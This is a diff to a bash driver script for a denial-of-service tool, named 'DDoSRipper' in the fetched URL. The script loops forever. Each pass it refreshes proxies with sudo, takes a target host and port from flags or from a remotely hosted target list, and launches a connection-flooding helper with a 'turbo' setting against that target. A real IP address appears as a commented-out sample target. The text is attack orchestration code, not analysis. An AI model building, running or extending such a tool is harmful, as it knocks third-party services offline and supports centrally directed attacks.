@@ -6,8 +6,8 @@ NC='\033[0m' # No Color
 while getopts s:p:t:o: flag
 do
     case "${flag}" in
-        s) server=${OPTARG};;
-        p) port=${OPTARG};;
+        s) serverinpt=${OPTARG};;
+        p) portinpt=${OPTARG};;
         t) turbo=${OPTARG};;
 	o) timeout=${OPTARG};;
     esac
@@ -21,21 +21,23 @@ while :
 do
     sudo ./updateproxies.sh
 
-    if [ -z $server ] || [ -z $port ]; then
-        echo -e "${YELLOW}GET target from GIT${NC} "
-        lns=$(wget -qO- https://raw.githubusercontent.com/GiDRaPiTaRdA/DDoSRipper/master/automation/target.txt)
+    if [ -z $serverinpt ] || [ -z $portinpt ]; then
+        echo -e "${YELLOW}GET target from GIT${NC}"
 
-        IFS=$'\n' read -d '' -r -a lines <<< $lns
+        declare target=($(./gettarget.sh))
 
-        server=${lines[0]}
+        server=${target[0]}
         server="${server:0:${#server}-1}"
 
-        port=${lines[1]}
+        port=${target[1]}
 
         #server="79.142.100.87"
         #port="80"
 
         echo "Server $server : $port"
+    else
+	server=$serverinpt
+        port=$portinpt
     fi
 
     sudo timeout ${timeout} ./loopconnect.sh -t ${turbo} -p ${port} -s ${server}
